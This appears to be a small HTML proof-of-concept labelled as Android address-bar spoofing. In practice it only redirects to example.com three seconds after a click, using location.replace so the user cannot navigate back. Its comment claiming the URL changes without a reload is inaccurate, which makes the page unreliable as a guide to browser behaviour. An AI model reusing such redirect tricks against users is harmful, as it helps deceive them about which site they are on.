<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Address Bar Spoofing PoC</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: sans-serif;
      background-color: #fafafa;
      cursor: pointer;
      user-select: none;
    }
    h1 {
      color: #333;
      text-align: center;
      max-width: 400px;
      padding: 20px;
    }
  </style>
</head>
<body>
  <h1>Click anywhere to simulate address bar spoofing.<br>Test on Android</h1>

  <script>
    document.addEventListener('click', async () => {
      // Wait for 3 seconds before "spoofing" the address bar
      setTimeout(() => {
        // Simulate the spoof by changing the URL without reloading the page
        window.location.replace("https://example.com");

        // You could also use document.location, but location.replace() is preferred
        // because it doesn't leave history behind, making it harder for users to
        // navigate back to the original page.
      }, 3000);
    }, { once: true });
  </script>
</body>
</html>
